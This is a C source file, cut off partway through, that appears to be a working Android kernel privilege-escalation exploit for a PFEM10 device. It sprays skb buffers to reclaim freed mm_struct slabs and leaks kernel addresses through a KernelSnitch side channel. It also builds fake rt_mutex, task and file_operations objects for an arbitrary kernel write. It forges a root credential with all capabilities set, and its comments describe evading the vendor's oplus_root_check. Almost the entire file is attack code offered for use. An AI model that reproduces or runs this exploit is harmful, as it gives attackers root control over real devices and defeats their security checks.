/* ============================================================================
 * pfem10-spray / payload.c — PFEM10 pi-tree 写原语: skb 堆喷占位 + payload 构建
 * ============================================================================
 * 设备代码（NDK aarch64）。流程 (IonStack util.c prepare_kernel_page 同构):
 *   1. 批量 clone 持有 mm_struct 的占位子进程 (prepare/spray/pre/post ctx),
 *      /proc/<pid>/mem 打开的 memfd 钉住 mm（防提前释放）
 *   2. 集成 KernelSnitch（改进版: measure_cpu 绑大核 + fork 子进程堆叠）泄 mm_struct
 *   3. 按 IonStack 实证顺序释放 mm slab (order-3 32KB 块) + pcp_shaping 预热
 *   4. sendmsg 大 skb 回收锚点块, payload 落在 payload_base = base + SKB_DATA_DELTA
 *
 * 移植差异: 5.10 compact waiter、PFEM10 fops 布局 (ioctl@0x50)、configfs
 * read/write_bin_file、fake_w0 prio=120 树哨兵裁定（见 payload.h 头注）。
 *
 * 编译 (NDK, 与 kernelsnitch_pfem10 同工具链 r28c):
 *   aarch64-linux-android26-clang -O1 -Wall -Wextra -pthread \
 *     -o pfem10_spray payload.c
 * 运行: adb shell /data/local/tmp/pfem10_spray [SLIDE|FOPS]   # 默认 SLIDE
 * 环境变量: SKB_DATA_DELTA / KPHYS / KSNITCH_COLLISIONS / PREPARE_SLABS
 * ============================================================================
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>

#include "payload.h"
#include "../lib/kernelsnitch.h"

/* ------------------------- 运行时环境覆盖 ------------------------- */
static int64_t  g_skb_data_delta = PFEM10_PAYLOAD_SKB_DATA_DELTA_DEFAULT;
static uintptr_t g_kphys         = PFEM10_PAYLOAD_KERNEL_PHYS_LOAD_DEFAULT;
static size_t   g_ks_collisions  = PFEM10_PAYLOAD_KSNITCH_COLLISIONS_DEFAULT;
static size_t   g_prepare_slabs  = PFEM10_PAYLOAD_PREPARE_SLABS_DEFAULT;
/* KASLR slide（运行时 image 地址 = KIMAGE_TEXT_BASE + 偏移 + g_slide）。
 * 真机实证 slide=0（v9 泄露的 logger 别名 == 静态地址的直映射别名）; v10
 * 在 SLIDE 阶段后回填, FOPS 阶段用运行时地址构建 fake_fops 表。 */
static int64_t  g_slide = 0;

/* ------------------------- 全局锚点/地址 --------------------------- */
static struct pfem10_payload_layout L;
uintptr_t fake_lock, fake_w0, fake_task, fake_fops;
uintptr_t fake_parent, fake_right, fake_left;
uintptr_t binwrite_target;
/* 伪造 root cred 副本的喷页内地址（W2/W5 cred 写用, 不依赖内核 init_cred 符号）。 */
uintptr_t g_cred_copy_addr;
/* caps-only 规避 oplus_root_check (2026-08-26): cred 副本的 uid/gid/euid/egid 等
 * 8 个字段统一填此值。默认 0 = root (触发 root_check 击杀); V12_CRED_UID=2000
 * → uid 恒 2000 + 5 caps 全 1 = 持全 caps 但 uid 不变, root_check 不判提权。 */
unsigned int g_cred_uid = 0;

static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static int cred_sv[2] = {-1, -1};     /* ★ isolated socket for cred copy page */
static int memfd_leak = -1;
static size_t mm_objs_per_slab;
static struct mm_ctx {
    size_t mm_cnt;
    pid_t *childs;
    int *memfds;
} prepare_ctx, spray_ctx, pre_ctx, post_ctx;
static struct kernelsnitch_shared_state *ks;
static pid_t child_leak;

/* ------------------------- 直映射别名 ----------------------------- */
static uintptr_t p0_data_alias(uintptr_t image_off)
{
    return pfem10_data_alias(image_off, g_kphys);
}

/* ------------------------- 小工具 ----------------------------- */
static void put64(unsigned char *p, size_t off, uint64_t value)
{
    memcpy(p + off, &value, sizeof(value));
}
static void put32(unsigned char *p, size_t off, uint32_t value)
{
    memcpy(p + off, &value, sizeof(value));
}

static long env_long(const char *name, long def)
{
    char *v = getenv(name);
    if (!v) return def;
    return strtol(v, NULL, 0);
}
static size_t env_size(const char *name, size_t def, size_t min, size_t max)
{
    char *v = getenv(name);
    if (!v) return def;
    size_t val = (size_t)strtoull(v, NULL, 0);
    if (val < min) return min;
    if (val > max) return max;
    return val;
}

/* ------------------------- measure-cpu (main.c 同款) ------------- */
static int read_sysfs_u64(const char *path, uint64_t *out)
{
    char buf[64];
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    int saved_errno = errno;
    close(fd);
    if (n <= 0) { errno = saved_errno; return 0; }
    buf[n] = 0;
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(buf, &end, 10);
    if (errno || end == buf) return 0;
    while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') end++;
    if (*end) return 0;
    *out = (uint64_t)value;
    return 1;
}

static int init_measure_cpu(void)
{
    cpu_set_t initial;
    if (sched_getaffinity(0, sizeof(initial), &initial) != 0) return -1;
    long configured = sysconf(_SC_NPROCESSORS_CONF);
    if (configured <= 0 || configured > CPU_SETSIZE) configured = CPU_SETSIZE;
    int best = -1, fallback = -1;
    uint64_t best_freq = 0, best_capacity = 0;
    for (int cpu = 0; cpu < configured; cpu++) {
        if (!CPU_ISSET(cpu, &initial)) continue;
        char path[160];
        uint64_t online = 1;
        snprintf(path, sizeof(path), "/sys/devices/system/cpu/cpu%d/online", cpu);
        if (read_sysfs_u64(path, &online) && online != 1) continue;
        fallback = cpu;
        uint64_t freq = 0;
        snprintf(path, sizeof(path),
                 "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", cpu);
        if (!read_sysfs_u64(path, &freq)) {
            snprintf(path, sizeof(path),
                     "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_max_freq", cpu);
            if (!read_sysfs_u64(path, &freq)) continue;
        }
        uint64_t capacity = 0;
        snprintf(path, sizeof(path),
                 "/sys/devices/system/cpu/cpu%d/cpu_capacity", cpu);
        (void)read_sysfs_u64(path, &capacity);
        if (best < 0 || freq > best_freq ||
            (freq == best_freq && capacity > best_capacity) ||
            (freq == best_freq && capacity == best_capacity && cpu > best)) {
            best = cpu; best_freq = freq; best_capacity = capacity;
        }
    }
    if (best < 0) {
        int current = sched_getcpu();
        if (current >= 0 && current < CPU_SETSIZE && CPU_ISSET(current, &initial))
            best = current;
        else
            best = fallback;
    }
    return best;
}

/* ------------------------- 子进程管理 (IonStack 同款) ------------- */
static pid_t clone_child(void)
{
    pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
    if (child == 0) {
        SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
        if (getppid() == 1) _exit(0);
        pin_to_core(0);
        for (;;) pause();
    }
    return child;
}

/* 泄露子进程: 改进版 KernelSnitch 堆叠 (绑大核) */
static pid_t clone_leak_child(void)
{
    pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
    if (child == 0) {
        int measure_cpu = init_measure_cpu();
        if (measure_cpu >= 0)
            pin_to_core(measure_cpu);
        kernelsnitch_find_collisions(ks);
        _exit(0);
    }
    return child;
}

static int open_memfd(pid_t child)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", child);
    return SYSCHK(open(path, O_RDONLY));
}

static void kill_child(pid_t child)
{
    if (child <= 0) return;
    SYSCHK(kill(child, SIGKILL));
    SYSCHK(waitpid(child, NULL, 0));
}

static void close_reclaim_sockets(void)
{
    for (int i = 0; i < 2; i++) {
        if (reclaim_sv[i] >= 0) { close(reclaim_sv[i]); reclaim_sv[i] = -1; }
        if (cred_sv[i] >= 0)    { close(cred_sv[i]);    cred_sv[i] = -1; }
    }
}

static void close_ctx_memfds(struct mm_ctx *ctx)
{
    for (size_t i = 0; i < ctx->mm_cnt; i++)
        if (ctx->memfds && ctx->memfds[i] > 0) { close(ctx->memfds[i]); ctx->memfds[i] = -1; }
}

static void free_ctx_storage(struct mm_ctx *ctx)
{
    free(ctx->childs); free(ctx->memfds);
    ctx->childs = NULL; ctx->memfds = NULL; ctx->mm_cnt = 0;
}

static void cleanup_page_prepare_state(void)
{
    close_ctx_memfds(&prepare_ctx);
    close_ctx_memfds(&spray_ctx);
    close_ctx_memfds(&pre_ctx);
    close_ctx_memfds(&post_ctx);
    if (memfd_leak > 0) { close(memfd_leak); memfd_leak = -1; }
    free_ctx_storage(&prepare_ctx);
    free_ctx_storage(&spray_ctx);
    free_ctx_storage(&pre_ctx);
    free_ctx_storage(&post_ctx);
    free(skb_buf); skb_buf = NULL;
}

static void prepare_ctxs(void)
{
    prepare_ctx.mm_cnt = g_prepare_slabs * mm_objs_per_slab;
    prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
    prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

    spray_ctx.mm_cnt = (1 + PFEM10_PAYLOAD_MM_PARTIALS) * mm_objs_per_slab;
    spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
    spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

    pre_ctx.mm_cnt = mm_objs_per_slab - 1;
    pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
    pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

    post_ctx.mm_cnt = mm_objs_per_slab;
    post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
    post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

/* ------------------------- fake fops 表 (PFEM10 5.10 KMI 布局) --- */
/* ★ 表内存 .cfi_jt 蹦床运行时地址（与真实 fops 表同约定; vmlinux nm 实证:
 *   configfs_bin_file_operations.read = CFG_READ_BIN_CFI_JT, ashmem_fops 同）。
 * KMI 槽位: read@0x10 / write@0x18 / ioctl@0x50 / compat@0x58 /
 * open@0x70 / release@0x80（unlocked_ioctl 比 vanilla 偏移 0x18）。
 * [7] 副作用会覆盖 fake_fops+0x08(llseek) = 写目标别名 — 置 0 即可（不 lseek）。
 * release=0: 绝不 close 劫持 fd（configfs_release 会 vfree(目标) 崩溃）。 */
static void pfem10_put_fake_fops_table(unsigned char *p, size_t off)
{
    uintptr_t s = (uintptr_t)(int64_t)g_slide;
    put64(p, off + 0x00, 0);   /* owner: 0 = 模块引用跳过 */
    put64(p, off + PFEM10_PAYLOAD_FOPS_LLSEEK_OFF, 0);
    put64(p, off + PFEM10_PAYLOAD_FOPS_READ_OFF,
          PFEM10_KIMAGE_TEXT_BASE + PFEM10_PAYLOAD_OFF_CONFIGFS_READ_BIN_FILE_CFI_JT + s);
    put64(p, off + PFEM10_PAYLOAD_FOPS_WRITE_OFF,
          PFEM10_KIMAGE_TEXT_BASE + PFEM10_PAYLOAD_OFF_CONFIGFS_WRITE_BIN_FILE_CFI_JT + s);
    put64(p, off + PFEM10_PAYLOAD_FOPS_READ_ITER_OFF, 0);
    /* PFEM10 vfs_write: .write==0 时走 .write_iter; 置 0 会被 VFS 返回 -EINVAL。
     * configfs bin ops 本身就是 fops.write/write_iter 双入口语义。 */
    put64(p, off + PFEM10_PAYLOAD_FOPS_WRITE_ITER_OFF,
          PFEM10_KIMAGE_TEXT_BASE +
          PFEM10_PAYLOAD_OFF_CONFIGFS_WRITE_BIN_FILE_CFI_JT + s);
    put64(p, off + PFEM10_PAYLOAD_FOPS_IOCTL_OFF,
          PFEM10_KIMAGE_TEXT_BASE + PFEM10_PAYLOAD_OFF_ASHMEM_IOCTL_CFI_JT + s);
    put64(p, off + PFEM10_PAYLOAD_FOPS_COMPAT_IOCTL_OFF,
          PFEM10_KIMAGE_TEXT_BASE + PFEM10_PAYLOAD_OFF_ASHMEM_COMPAT_IOCTL_CFI_JT + s);
    put64(p, off + PFEM10_PAYLOAD_FOPS_MMAP_OFF, 0);
    put64(p, off + PFEM10_PAYLOAD_FOPS_OPEN_OFF,
          PFEM10_KIMAGE_TEXT_BASE + PFEM10_PAYLOAD_OFF_ASHMEM_OPEN_CFI_JT + s);
    put64(p, off + PFEM10_PAYLOAD_FOPS_RELEASE_OFF, 0);
    put64(p, off + PFEM10_PAYLOAD_FOPS_SPLICE_READ_OFF, 0);
    put64(p, off + PFEM10_PAYLOAD_FOPS_SHOW_FDINFO_OFF, 0);
}

/* ------------------------- payload 构建 -------------------------- */
/*
 * leaked = KernelSnitch 泄露的 mm_struct 地址 (真机: 0xffffff87879ebfc0)
 * mode   = PFEM10_PAYLOAD_SLIDE / PFEM10_PAYLOAD_FOPS
 *
 * 锚点: base = leaked & ~(ORDER3_SIZE-1); payload_base = base + SKB_DATA_DELTA
 *
 * 写原语形状 (设计文档 §3.1/3.2, fd_set 驱动):
 *   fd_set in[0]=write_value  in[1]=0 (rb_right)  in[2]=write_target (rb_left)
 *   → [7] rb_erase_cached Case 1-left: *(write_target) = write_value
 *   (write_value 须 8 对齐; rb_set_parent 置 bit0=BLACK, 指针低位无妨)
 * 副作用: parent = write_value & ~3 → __rb_change_child 写 *(parent+0x08/0x10)
 *   = write_target。FOPS 模式 parent=fake_fops(喷页内, 槽可修复)。
 *
 * fake 对象职责:
 *   fake_lock : [5] wait_lock=0; [7] waiters 树 (root=leftmost=fake_w0 非空 →
 *               prerequeue_top_waiter 有效 + [11] else 分支); [9] owner=fake_task
 *   fake_w0   : 树哨兵 (prio=120 ≤ W prio, 防 [7] enqueue 抢 leftmost)
 *   fake_task : [10] usage/pi_lock; [12] pi_blocked_on=0 → 链干净返回
 *   fake_fops : FOPS 模式 configfs 桥
 */
static int pfem10_prepare_skb_payload(uintptr_t leaked, int mode)
{
    memset(skb_buf, 0, PFEM10_PAYLOAD_SKB_SEND_SIZE);
    L = pfem10_layout_from_mm(leaked, g_skb_data_delta);

    fake_lock = L.fake_lock;
    fake_w0   = L.fake_w0;
    fake_task = L.fake_task;
    fake_fops = L.fake_fops;
    binwrite_target = L.scratch;

    /* ★ 以事实为准 (2026-08-26 复盘): v9/v12 成功时代的 payload.c
     * (bak_witer 同源) 用 KIMAGE_TEXT_BASE + 偏移 计算 init_task/root_task_group
     * 的 image 虚拟地址, 真机 W1 HIT (SELinux 关) + v9 boot_id 精确命中。
     * 曾改为 p0_data_alias (direct-map 别名) 属无实证推测 → 改后全 R。
     * 回退恢复实证版本。 */
    uintptr_t init_task_img = PFEM10_KIMAGE_TEXT_BASE + PFEM10_PAYLOAD_OFF_INIT_TASK;
    uintptr_t root_tg_img   = PFEM10_KIMAGE_TEXT_BASE + PFEM10_PAYLOAD_OFF_ROOT_TASK_GROUP;
    uintptr_t misc_fops     = p0_data_alias(PFEM10_PAYLOAD_OFF_ASHMEM_MISC_FOPS);

    if (mode == PFEM10_PAYLOAD_FOPS) {
        /* [7] 主写: *(miscdevice.fops 槽) = fake_fops
           副作用: *(fake_fops+0x08/0x10) = misc_fops (喷页内表槽, 可修复) */
        fake_parent = fake_fops;
        fake_right  = 0;                          /* fd_set in[1] */
        fake_left   = misc_fops;                  /* fd_set in[2] = 写目标 */
    } else {
        /* SLIDE: *(boot_id 数据槽直映射) = logger 别名 (KASLR 无关) */
        fake_parent = p0_data_alias(PFEM10_PAYLOAD_OFF_SLIDE_NFULNL_LOGGER);
        fake_right  = 0;
        fake_left   = p0_data_alias(PFEM10_PAYLOAD_OFF_SLIDE_BOOT_ID);
    }

    for (size_t chunk = 0; chunk < PFEM10_PAYLOAD_SKB_SEND_SIZE;
         chunk += PFEM10_PAYLOAD_ORDER3_SIZE) {
        unsigned char *p = skb_buf + chunk + PFEM10_PAYLOAD_SKB_FRAG_BIAS;

        /* --- fake_lock (rt_mutex) @ LOCK_OFF --- */
        put32(p, PFEM10_PAYLOAD_LOCK_OFF + 0x00, 0);            /* wait_lock */
        put64(p, PFEM10_PAYLOAD_LOCK_OFF + 0x08, fake_w0);      /* waiters.rb_root.rb_node */
        put64(p, PFEM10_PAYLOAD_LOCK_OFF + 0x10, fake_w0);      /* waiters.rb_leftmost */
        put64(p, PFEM10_PAYLOAD_LOCK_OFF + 0x18, fake_task | 1);/* owner | HAS_WAITERS */

        /* --- fake_w0 (rt_mutex_waiter, 树哨兵) @ W0_OFF ---
           tree: pc=1(BLACK 根), right=0, left=0
           pi_tree: 防万一 (设计 [11] 走 else, 不碰 pi_waiters) */
        put64(p, PFEM10_PAYLOAD_W0_OFF + 0x00, 1);              /* tree.pc */
        put64(p, PFEM10_PAYLOAD_W0_OFF + 0x08, 0);              /* tree.right */
        put64(p, PFEM10_PAYLOAD_W0_OFF + 0x10, 0);              /* tree.left */
        put32(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_PRIO_OFF,
              PFEM10_PAYLOAD_FAKE_W0_PRIO);                     /* ★ 120, 非 130 */
        put64(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_DEADLINE_OFF, 0);
        put64(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_PI_TREE_ENTRY_OFF + 0x00,
              fake_parent);                                     /* pi_tree.pc (防万一) */
        put64(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_PI_TREE_ENTRY_OFF + 0x08,
              fake_right);
        put64(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_PI_TREE_ENTRY_OFF + 0x10,
              fake_left);
        put32(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_PI_TREE_ENTRY_OFF +
              PFEM10_PAYLOAD_WAITER_PRIO_OFF, PFEM10_PAYLOAD_FAKE_W0_PRIO);
        put64(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_PI_TREE_ENTRY_OFF +
              PFEM10_PAYLOAD_WAITER_DEADLINE_OFF, 0);
        put64(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_TASK_OFF, init_task_img);
        put64(p, PFEM10_PAYLOAD_W0_OFF + PFEM10_PAYLOAD_WAITER_LOCK_OFF, fake_lock);

        /* --- fake_task (task_struct 形态) @ FAKE_TASK_OFF ---
           [C] 编译偏移: usage 0x40 / prio 0x84 / normal_prio 0x8C /
           sched_task_group 0x310 / pi_lock 0x86C / pi_waiters 0x880 /
           pi_top_task 0x890 / pi_blocked_on 0x898 */
        put32(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_USAGE_OFF,
              PFEM10_PAYLOAD_FAKE_TASK_USAGE);
        put32(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_PRIO_OFF,
              PFEM10_PAYLOAD_FAKE_TASK_PRIO);
        put32(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_NORMAL_PRIO_OFF,
              PFEM10_PAYLOAD_FAKE_TASK_PRIO);
        put64(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_TASK_GROUP_OFF,
              root_tg_img);
        put32(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_PI_LOCK_OFF, 0);
        put64(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_PI_WAITERS_OFF, 0);
        put64(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
        put64(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_PI_TOP_TASK_OFF,
              init_task_img);
        put64(p, PFEM10_PAYLOAD_FAKE_TASK_OFF + PFEM10_PAYLOAD_FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

        /* --- 辅助 rb 节点 --- */
        put64(p, PFEM10_PAYLOAD_RIGHT_OFF + 0x00, fake_parent);
        put64(p, PFEM10_PAYLOAD_RIGHT_OFF + 0x08, 0);
        put64(p, PFEM10_PAYLOAD_RIGHT_OFF + 0x10, 0);
        put64(p, PFEM10_PAYLOAD_LEFT_OFF + 0x00, fake_parent);
        put64(p, PFEM10_PAYLOAD_LEFT_OFF + 0x08, 0);
        put64(p, PFEM10_PAYLOAD_LEFT_OFF + 0x10, 0);

        /* --- FOPS 模式: fake fops 表 --- */
        if (mode == PFEM10_PAYLOAD_FOPS)
            pfem10_put_fake_fops_table(p, PFEM10_PAYLOAD_FOPS_OFF);

        /* --- 伪造 root cred 副本 (SLIDE+FOPS 都填: W2/W5 用 SLIDE spray 但
               cred 写值取自本区; 0x3C00/0x3D00 位于 FAKE_TASK(0x3A98) 之后、
               RIGHT(0x4440) 之前, 布局空闲区, 不破坏任何模式)。
               布局 = init_cred 字节实证 (vmlinux .data dump, CONFIG_KEYS=y):
               usage@0x00 uid@0x04 gid@0x08 suid@0x0c sgid@0x10 euid@0x14
               egid@0x18 fsuid@0x1c fsgid@0x20 securebits@0x24
               cap_inheritable@0x28 cap_permitted@0x30 cap_effective@0x38
               cap_bset@0x40 cap_ambient@0x48 jit_keyring@0x50
               session_keyring@0x58 process_keyring@0x60 thread_keyring@0x68
               request_key_auth@0x70 security@0x78 user@0x80 user_ns@0x88
               group_info@0x90 rcu@0x98 sizeof 0xA8。
               2026-08-26 重分析修正: 旧副本按无 KEYS 布局填 user@0x50/
               group_info@0x58 是错的 (实为 keyring 区), user_ns 从未填
               (=NULL) → uid!=0 时 getuid()/ns_capable 必 panic (root 模式
               uid=0 短路逃过, 所以之前没炸)。现按实证偏移补全 user/group_info
               + user_ns=init_user_ns + 5 个 caps + security blob
               (osid/sid=KERNEL_SID=1), keyring 区留 NULL (正常)。 */
        {
            unsigned char *c = p + PFEM10_PAYLOAD_CRED_COPY_OFF;
            memset(c, 0, PFEM10_CRED_SIZE /* 0xA8 */);
            /* usage 置大数: 父进程 (caps-only) 带此 cred 运行到退出时 put_cred
               递减, 若为 1 → kfree 喷页 → 崩溃; 大数保证永不释放。 */
            put32(c, PFEM10_CRED_USAGE, 0x40000000);
            /* uid 族 8 字段统一 g_cred_uid: 默认 0 = root;
               V12_CRED_UID=2000 → caps-only (uid 不变 + 全 caps) */
            put32(c, PFEM10_CRED_UID,     g_cred_uid);
            put32(c, PFEM10_CRED_GID,     g_cred_uid);
            put32(c, PFEM10_CRED_SUID,    g_cred_uid);
            put32(c, PFEM10_CRED_SGID,    g_cred_uid);
            put32(c, PFEM10_CRED_EUID,    g_cred_uid);
            put32(c, PFEM10_CRED_EGID,    g_cred_uid);
            put32(c, PFEM10_CRED_FSUID,   g_cred_uid);
            put32(c, PFEM10_CRED_FSGID,   g_cred_uid);
            /* securebits 0 (memset) */
            put64(c, PFEM10_CRED_CAP_INHERITABLE, 0xFFFFFFFFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_PERMITTED,  0xFFFFFFFFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_EFFECTIVE,  0xFFFFFFFFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_BSET,       0xFFFFFFFFFFFFFFFFULL);
            put64(c, PFEM10_CRED_CAP_AMBIENT,    0xFFFFFFFFFFFFFFFFULL);
            /* user@0x80 / user_ns@0x88 / group_info@0x90 (实证偏移): caps-only
               模式下进程会真实 deref (in_group_p/uid 映射/ns_capable 等),
               不能留 0 → 指向内核常驻对象 root_user / init_user_ns /
               init_groups 直映射别名 (immortal, 无 UAF)。 */
            put64(c, PFEM10_CRED_USER,       p0_data_alias(PFEM10_OFF_ROOT_USER));
            put64(c, PFEM10_CRED_USER_NS,    p0_data_alias(PFEM10_OFF_INIT_USER_NS));
            put64(c, PFEM10_CRED_GROUP_INFO, p0_data_alias(PFEM10_OFF_INIT_GROUPS));
            put64(c, PFEM10_CRED_SECURITY, L.payload_base + PFEM10_PAYLOAD_SECBLOB_OFF);
            unsigned char *s = p + PFEM10_PAYLOAD_SECBLOB_OFF;
            memset(s, 0, 0x40);
            put32(s, 0x00, 1);   /* osid = KERNEL_SID */
            put32(s, 0x04, 1);   /* sid  = KERNEL_SID */
        }
        /* ★ 2026-08-26 fix: cred copy moved to chunk 1 (second 32KB page).
         * Previously it was at payload_base+0x3C00 (chunk 0, same physical page as
         * fd_set/fake_task/fake_lock). Chain async commit could partially reclaim
         * that page → cred copy content drifted → oplus_root_check read garbage egid
         * → SIGKILL. Isolating to chunk 1 (payload_base + ORDER3_SIZE + 0x3C00)
         * gives the cred copy its own 32KB page, immune to main-page reuse. */
        g_cred_copy_addr = L.payload_base + PFEM10_PAYLOAD_ORDER3_SIZE + PFEM10_PAYLOAD_CRED_COPY_OFF;
        /* Phase1 判别 dump (2026-08-26): 铁证副本内容, 排除副本 fill 问题 */
        if (chunk == 1) { /* ★ dump from cred copy page */
            unsigned char *cc = p + PFEM10_PAYLOAD_CRED_COPY_OFF;
            uint32_t du, dg, deu, deg;
            uint64_t dce, duser, dns, dgrp, dsec;
            memcpy(&du,    cc + PFEM10_CRED_UID, 4);
            memcpy(&dg,    cc + PFEM10_CRED_GID, 4);
            memcpy(&deu,   cc + PFEM10_CRED_EUID, 4);
            memcpy(&deg,   cc + PFEM10_CRED_EGID, 4);
            memcpy(&dce,   cc + PFEM10_CRED_CAP_EFFECTIVE, 8);
            memcpy(&duser, cc + PFEM10_CRED_USER, 8);
            memcpy(&dns,   cc + PFEM10_CRED_USER_NS, 8);
            memcpy(&dgrp,  cc + PFEM10_CRED_GROUP_INFO, 8);
            memcpy(&dsec,  cc + PFEM10_CRED_SECURITY, 8);
            pr_info("[+] cred copy @0x%zx: uid=%u gid=%u euid=%u egid=%u "
                    "cap_eff=0x%llx user=0x%zx user_ns=0x%zx groups=0x%zx sec=0x%zx\n",
                    (size_t)g_cred_copy_addr, du, dg, deu, deg,
                    (unsigned long long)dce, (size_t)duser, (size_t)dns,
                    (size_t)dgrp, (size_t)dsec);
        }
    }

    pr_info("[+] payload built: mm=0x%zx base=0x%zx delta=%lld payload_base=0x%zx\n"
            "    fake_lock=0x%zx fake_w0=0x%zx fake_task=0x%zx fake_fops=0x%zx\n",
            (size_t)leaked, (size_t)L.base, (long long)g_skb_data_delta,
            (size_t)L.payload_base,
            (size_t)fake_lock, (size_t)fake_w0, (size_t)fake_task, (size_t)fake_fops);
    pr_info("    fd_set shape: in[0]=0x%zx (write_value) in[1]=0 in[2]=0x%zx (write_target)\n",
            (size_t)fake_parent, (size_t)fake_left);
    return 1;
}

/* ------------------------- 占位 + 泄露 + 回收 + 堆喷 ------------- */
static uintptr_t pfem10_prepare_kernel_page(int mode)
{
    close_reclaim_sockets();
    mm_objs_per_slab = PFEM10_PAYLOAD_ORDER3_SIZE / PFEM10_PAYLOAD_MM_STRUCT_SZ;
    prepare_ctxs();

    skb_buf = malloc(PFEM10_PAYLOAD_SKB_SEND_SIZE);
    if (!skb_buf) { cleanup_page_prepare_state(); return 0; }
    memset(skb_buf, 0x41, PFEM10_PAYLOAD_SKB_SEND_SIZE);

    /* 1. 占位: prepare/spray 子进程 mm_struct 铺满 mm 缓存 slab */
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        prepare_ctx.childs[i] = clone_child();
        prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
    }
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
        spray_ctx.childs[i] = clone_child();
        spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
    }

    /* 2. KernelSnitch setup (ks mmap 共享) */
    ks = kernelsnitch_setup(PFEM10_PAYLOAD_MM_STRUCT_SZ, PFEM10_PAYLOAD_MM_ORDER,
                            (size_t)sysconf(_SC_NPROCESSORS_ONLN) * 2,
                            g_ks_collisions, 1, 0 /* mte off: 真机泄露未打 tag */);
    if (!ks) {
        for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) kill_child(prepare_ctx.childs[i]);
        cleanup_page_prepare_state();
        return 0;
    }

    /* 3. pre 子进程 → 泄露子进程 → post 子进程 (锚点块位置受此顺序控制) */
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
        pre_ctx.childs[i] = clone_child();
    child_leak = clone_leak_child();
    for (size_t i = 0; i < post_ctx.mm_cnt; i++)
        post_ctx.childs[i] = clone_child();

    /* 4. memfd 钉住全部 mm (泄露子进程的 mm 即锚点块成员) */
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
        pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
    memfd_leak = open_memfd(child_leak);
    for (size_t i = 0; i < post_ctx.mm_cnt; i++)
        post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);

    /* 5. 释放顺序 (IonStack 实证): pre/post/spray 子进程先死, mm 仍被 memfd 钉住 */
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) kill_child(pre_ctx.childs[i]);
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) kill_child(post_ctx.childs[i]);
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) kill_child(spray_ctx.childs[i]);
    SYSCHK(waitpid(child_leak, NULL, 0));

    if (!kernelsnitch_found_collisions(ks)) {
        pr_warning("[!] KernelSnitch collision finding failed\n");
        kernelsnitch_cleanup(ks); ks = NULL;
        for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) kill_child(prepare_ctx.childs[i]);
        cleanup_page_prepare_state();
        return 0;
    }

    /* 6. 暴力枚举 mm_struct 候选 → 泄露地址 */
    kernelsnitch_bruteforce(ks);
    uintptr_t leaked = ks->mm_struct;
    if (leaked == (uintptr_t)-1) {
        pr_warning("[!] KernelSnitch mm_struct leak failed\n");
